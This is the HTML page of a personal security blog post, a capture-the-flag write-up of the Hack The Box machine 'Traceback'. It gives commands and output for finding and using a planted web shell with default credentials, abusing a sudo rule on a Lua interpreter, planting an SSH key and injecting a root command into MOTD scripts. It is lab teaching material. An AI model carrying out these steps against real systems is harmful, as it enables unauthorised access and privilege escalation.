@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">
+
+  <meta name="description" content="Personal blog about IT, Electronics, InfoSec, Hacking, Bug Hunting...">
+  <meta name="keywords" content="Blog, Computer Science, IT, Electronics, Hacking, InfoSec, CTF, Bug Bounty, Open Source">
+  <meta name="author" content="Paul-Emmanuel Raoul">
+
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="&#x2F;favicon&#x2F;apple-touch-icon.png" />
+  
+  
+  <link rel="icon" type="image/png" sizes="16x16" href="&#x2F;favicon&#x2F;favicon-16x16.png" />
+  
+  
+  <link rel="icon" type="image/png" sizes="32x32" href="&#x2F;favicon&#x2F;favicon-32x32.png" />
+  
+  
+  <link rel="manifest" href="&#x2F;favicon&#x2F;site.webmanifest" />
+  
+
+  <title>Skyper&#x27;s blog</title>
+
+  <link rel="stylesheet" href="https://blog.skyplabs.net/css/style.css">
+
+  
+  <script defer data-domain="blog.skyplabs.net" src="https://plausible.io/js/plausible.js"></script>
+  
+
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+
+  <link rel="alternate" type="application/atom+xml" title="RSS" href="https://blog.skyplabs.net/atom.xml">
+</head>
+<body vocab="http://schema.org/" typeof="Blog">
+  
+  <div class="sidebar">
+    <div class="container sidebar-sticky">
+      <div class="sidebar-about">
+        <h1><a href="https://blog.skyplabs.net">Skyper&#x27;s blog</a></h1>
+        <p class="lead">Personal blog about IT, Electronics, InfoSec, Hacking, Bug Hunting...</p>
+      </div>
+
+      <div class="sidebar-links">
+        
+        <a class="icon-github" href="https://github.com/SkypLabs" title="GitHub" target="_blank" rel="noopener noreferrer"></a>
+        
+
+        
+        <a class="icon-docker-hub" href="https://hub.docker.com/u/skyplabs" title="Docker Hub" target="_blank" rel="noopener noreferrer"></a>
+        
+
+        
+        
+        
+        <a class="icon-mastodon" href="https://fosstodon.org/@Skyper" title="Mastodon" target="_blank" rel="me noopener noreferrer"></a>
+        
+
+        
+        <a class="icon-twitter" href="https://twitter.com/SkypLabs" title="Twitter" target="_blank" rel="noopener noreferrer"></a>
+        
+
+        
+        <a class="icon-linkedin" href="https://www.linkedin.com/in/peraoul" title="LinkedIn" target="_blank" rel="noopener noreferrer"></a>
+        
+
+        
+        <a class="icon-keybase" href="https://keybase.io/skyplabs" title="Keybase" target="_blank" rel="noopener noreferrer"></a>
+        
+
+        
+        <a class="icon-email" href="mailto:skyper@skyplabs.net" title="Email"></a>
+        
+
+        <a class="icon-rss" href="https://blog.skyplabs.net/atom.xml" title="RSS"></a>
+      </div>
+
+      <nav class="sidebar-nav">
+        <a class="sidebar-nav-item" href="/">Home</a>
+        
+        
+        <a class="sidebar-nav-item" href="/publications/">Publications</a>
+        
+        <a class="sidebar-nav-item" href="/about/">About me</a>
+        
+        <a class="sidebar-nav-item" href="/contact/">Contact</a>
+        
+        <a class="sidebar-nav-item" href="/support/">Support me</a>
+        
+      </nav>
+    </div>
+  </div>
+  
+
+  <div class="content container">
+    
+<article class="post" property="blogPost" typeof="BlogPosting">
+  
+  <div class="post-meta">
+    
+    <h2 class="post-title" property="headline">[HTB] Traceback</h2>
+    
+
+    <time class="post-date" datetime="2020-08-25 00:00"
+      property="datePublished">25 Aug 2020</time>
+    <div class="post-author" property="author" typeof="Person" hidden>
+      <span property="name">Paul-Emmanuel Raoul</span>
+      <span property="givenName">Paul-Emmanuel</span>
+      <span property="familyName">Raoul</span>
+      <span property="alternateName">Skyper</span>
+      <span property="email">skyper@skyplabs.net</span>
+    </div>
+  </div>
+
+
+  <div class="post-content" property="articleBody">
+    <p>Traceback is an easy Linux-based machine released on the 14th of March 2020 and
+reachable on the IP address <code>10.10.10.181</code> (despite what's written on the info
+card).</p>
+<p><img src="/posts/htb-traceback/htb-traceback-info-card.jpg" alt="HTB Traceback information card" /></p>
+<span id="continue-reading"></span><h2 id="user-flag">User flag</h2>
+<p>Nmap indicates us that the Traceback machine is running OpenSSH and Apache:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ nmap -A 10.10.10.181 | tee nmap.txt
+</span><span>Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 19:03 IST
+</span><span>Nmap scan report for 10.10.10.181
+</span><span>Host is up (0.029s latency).
+</span><span>Not shown: 998 closed ports
+</span><span>PORT   STATE SERVICE VERSION
+</span><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span><span>| ssh-hostkey:
+</span><span>|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
+</span><span>|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
+</span><span>|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
+</span><span>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span><span>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span><span>|_http-title: Help us
+</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span>
+</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span>Nmap done: 1 IP address (1 host up) scanned in 8.30 seconds
+</span></code></pre>
+<p>Let's have a look at the website available on port 80:</p>
+<p><img src="https://blog.skyplabs.net/posts/htb-traceback/htb-traceback-landing-page.png" alt="Landing page of the website accessible on port 80" /></p>
+<p>The <code>index.html</code> page doesn't contain much but this HTML comment:</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>&lt;</span><span style="color:#bf616a;">center</span><span>&gt;
+</span><span>  &lt;</span><span style="color:#bf616a;">h1</span><span>&gt;This site has been owned&lt;/</span><span style="color:#bf616a;">h1</span><span>&gt;
+</span><span>  &lt;</span><span style="color:#bf616a;">h2</span><span>&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/</span><span style="color:#bf616a;">h2</span><span>&gt;
+</span><span>  &lt;</span><span style="color:#bf616a;">h3</span><span>&gt; - Xh4H - &lt;/</span><span style="color:#bf616a;">h3</span><span>&gt;
+</span><span>  </span><span style="color:#65737e;">&lt;!--Some of the best web shells that you might need ;)--&gt;
+</span><span>&lt;/</span><span style="color:#bf616a;">center</span><span>&gt;
+</span></code></pre>
+<p>It is definitely a hint. A quick search on DuckDuckGo with the keywords &quot;Xh4H
+web shell&quot; returns <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/Xh4H/Web-Shells">https://github.com/Xh4H/Web-Shells</a> as first
+result. It is a Git repository full of web shells. One of them is certainly the
+one that the original attacker has left on the server!</p>
+<p>To create a wordlist with the web shells comprised in the Git repository, I
+called the <a rel="noopener nofollow noreferrer" target="_blank" href="https://docs.github.com/en/rest/git/trees#get-a-tree">GitHub API</a> with this one-liner command-line:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ curl -s https://api.github.com/repos/Xh4H/Web-Shells/git/trees/4c9bade954938d56597325b872739c1a2463cf91 | jq -r .tree[].path | grep -vi readme | tee web-shells.txt
+</span><span>alfa3.php
+</span><span>alfav3.0.1.php
+</span><span>andela.php
+</span><span>bloodsecv4.php
+</span><span>by.php
+</span><span>c99ud.php
+</span><span>cmd.php
+</span><span>configkillerionkros.php
+</span><span>jspshell.jsp
+</span><span>mini.php
+</span><span>obfuscated-punknopass.php
+</span><span>punk-nopass.php
+</span><span>punkholic.php
+</span><span>r57.php
+</span><span>smevk.php
+</span><span>wso2.8.5.php
+</span></code></pre>
+<p>Then, I fuzzed the web server with this wordlist using ZAP:</p>
+<p><img src="https://blog.skyplabs.net/posts/htb-traceback/htb-traceback-web-shells.png" alt="Output from ZAP's fuzzer with the list of web shells previously generated" /></p>
+<p>And voila! The backdoor is accessible at
+<a rel="noopener nofollow noreferrer" target="_blank" href="http://10.10.10.181/smevk.php">http://10.10.10.181/smevk.php</a>:</p>
+<p><img src="https://blog.skyplabs.net/posts/htb-traceback/htb-traceback-smevk-login-page.png" alt="SmEvk web shell's login page" /></p>
+<p>The credentials <code>admin:admin</code> are hard-coded in the web shell:
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/Xh4H/Web-Shells/blob/master/smevk.php#L14-L15">https://github.com/Xh4H/Web-Shells/blob/master/smevk.php#L14-L15</a>.</p>
+<p>Then, I used the terminal available in the &quot;Console&quot; tab to poke around a
+little:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ id
+</span><span>uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+</span><span>$ cat /home/webadmin/note.txt
+</span><span>- sysadmin -
+</span><span>I have left a tool to practice Lua.
+</span><span>I&#39;m sure you know where to find it.
+</span><span>Contact me if you have any question.
+</span></code></pre>
+<p>A Lua tool?</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ cat /home/webadmin/.bash_history
+</span><span>ls -la
+</span><span>sudo -l
+</span><span>nano privesc.lua
+</span><span>sudo -u sysadmin /home/sysadmin/luvit privesc.lua
+</span><span>rm privesc.lua
+</span><span>logout
+</span><span>$ sudo -l
+</span><span>Matching Defaults entries for webadmin on traceback:
+</span><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span><span>
+</span><span>User webadmin may run the following commands on traceback:
+</span><span>    (sysadmin) NOPASSWD: /home/sysadmin/luvit
+</span></code></pre>
+<p>It indeed seems that the <code>webadmin</code> user can execute <code>/home/sysadmin/luvit</code> on
+behalf of <code>sysadmin</code> without password.</p>
+<p><a rel="noopener nofollow noreferrer" target="_blank" href="https://luvit.io/">Luvit</a> is a program which &quot;implements the same APIs as Node.js, but in
+Lua!&quot;. We can therefore use it to execute Lua payloads. We fill prepare one for
+reading the user flag:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ printf &#39;file = io.open(&quot;/home/sysadmin/user.txt&quot;, &quot;r&quot;)\nio.input(file)\nprint(io.read())\nio.close(file)\n&#39; &gt; /tmp/read_flag.lua
+</span></code></pre>
+<p>And then:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ sudo -u sysadmin /home/sysadmin/luvit /tmp/read_flag.lua
+</span></code></pre>
+<p>Which gives us the user flag: <code>e564de9f40e354deb591fa121937ca0d</code>.</p>
+<h2 id="root-flag">Root flag</h2>
+<p>Before going further, I wanted to get a &quot;real&quot; shell so I added an SSH public
+key of mine to the <code>sysadmin</code> user's authorised keys and then connected back to
+the server as <code>sysadmin</code> via SSH.</p>
+<p>During the rest of my investigation, something caught my attention:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ find / -type f -writable 2&gt;/dev/null | grep -v &#39;^/proc&#39; | grep -v &#39;^/sys&#39;
+</span><span>/etc/update-motd.d/50-motd-news
+</span><span>/etc/update-motd.d/10-help-text
+</span><span>/etc/update-motd.d/91-release-upgrade
+</span><span>/etc/update-motd.d/00-header
+</span><span>/etc/update-motd.d/80-esm
+</span><span>/home/sysadmin/.bashrc
+</span><span>/home/sysadmin/luvit
+</span><span>/home/sysadmin/.bash_logout
+</span><span>/home/sysadmin/.ssh/authorized_keys
+</span><span>/home/sysadmin/.cache/motd.legal-displayed
+</span><span>/home/sysadmin/.bash_history
+</span><span>/home/sysadmin/.profile
+</span><span>/home/webadmin/note.txt
+</span></code></pre>
+<p>The <code>sysadmin</code> user can edit the MOTD scripts!</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ ls -al /etc/update-motd.d/
+</span><span>total 32
+</span><span>drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
+</span><span>drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
+</span><span>-rwxrwxr-x  1 root sysadmin  981 Aug 23 16:22 00-header
+</span><span>-rwxrwxr-x  1 root sysadmin  982 Aug 23 16:22 10-help-text
+</span><span>-rwxrwxr-x  1 root sysadmin 4264 Aug 23 16:22 50-motd-news
+</span><span>-rwxrwxr-x  1 root sysadmin  604 Aug 23 16:22 80-esm
+</span><span>-rwxrwxr-x  1 root sysadmin  299 Aug 23 16:22 91-release-upgrade
+</span></code></pre>
+<p>This is really bad (for the server's owner at least) because these scripts are
+executed upon any new SSH connection as defined in <code>/etc/pam.d/sshd</code>:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>...
+</span><span># Print the message of the day upon successful login.
+</span><span># This includes a dynamically generated part from /run/motd.dynamic
+</span><span># and a static (admin-editable) part from /etc/motd.
+</span><span>session    optional     pam_motd.so  motd=/run/motd.dynamic
+</span><span>session    optional     pam_motd.so noupdate
+</span><span>....
+</span></code></pre>
+<p>All I need is to modify one of those scripts to print the root flag:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ echo &#39;cat /root/root.txt&#39; &gt;&gt; /etc/update-motd.d/00-header
+</span></code></pre>
+<p>And when one logs in via SSH:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ ssh -o PasswordAuthentication=no -i ~/.ssh/traceback sysadmin@10.10.10.181
+</span><span>#################################
+</span><span>-------- OWNED BY XH4H  ---------
+</span><span>- I guess stuff could have been configured better ^^ -
+</span><span>#################################
+</span><span>
+</span><span>Welcome to Xh4H land
+</span><span>
+</span><span>fa6d76ff6866c37f381b5f6e40f8ce89
+</span><span>
+</span><span>
+</span><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span><span>
+</span><span>Last login: Sun Aug 23 16:23:41 2020 from 10.10.14.16
+</span><span>$
+</span></code></pre>
+<p>The root flag was <code>fa6d76ff6866c37f381b5f6e40f8ce89</code>.</p>
+
+  </div>
+
+  
+  
+  <span class="categories" property="keywords">
+    
+    
+    <a href="https:&#x2F;&#x2F;blog.skyplabs.net&#x2F;categories&#x2F;security&#x2F;">Security</a>
+    
+    
+  </span>
+  
+
+  
+  <span class="tags" property="keywords">
+    
+    
+    <a href="https:&#x2F;&#x2F;blog.skyplabs.net&#x2F;tags&#x2F;ctf&#x2F;">CTF</a>
+     · 
+    
+    
+    <a href="https:&#x2F;&#x2F;blog.skyplabs.net&#x2F;tags&#x2F;web&#x2F;">Web</a>
+    
+    
+  </span>
+  
+
+</article>
+
+  </div>
+  <script type="text/javascript" src="https://blog.skyplabs.net/elasticlunr.min.js"></script>
+  <script type="text/javascript" src="https://blog.skyplabs.net/search_index.en.js"></script>
+  <script type="text/javascript" src="https://blog.skyplabs.net/js/search.js"></script>
+</body>
+</html>
